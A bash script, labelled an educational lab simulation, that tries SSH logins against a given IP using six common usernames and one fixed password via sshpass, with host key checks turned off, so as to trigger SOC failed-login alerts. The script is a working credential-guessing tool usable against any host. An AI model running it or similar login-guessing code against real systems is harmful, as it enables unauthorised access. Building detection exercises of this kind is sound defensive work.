#!/bin/bash

# SSH Brute Force Simulation Script
# This script simulates a brute force attack by attempting multiple SSH logins with common usernames.
# NOTE: This is for educational purposes within a controlled lab environment.

TARGET_IP=$1

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

USERNAMES=("admin" "root" "user" "test" "guest" "support")
PASSWORD="Password123!"

echo "[*] Starting SSH Brute Force Simulation against $TARGET_IP..."

for USER in "${USERNAMES[@]}"; do
    echo "[*] Attempting login with username: $USER"
    # Use sshpass to simulate automated login attempts (needs to be installed)
    # We use -o StrictHostKeyChecking=no to avoid prompts
    sshpass -p "$PASSWORD" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$USER@$TARGET_IP" exit 2>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] Success! Found valid credentials for $USER"
    else
        echo "[-] Failed login for $USER"
    fi
    sleep 1
done

echo "[*] Simulation complete. Check your SOC logs for multiple failed login alerts."
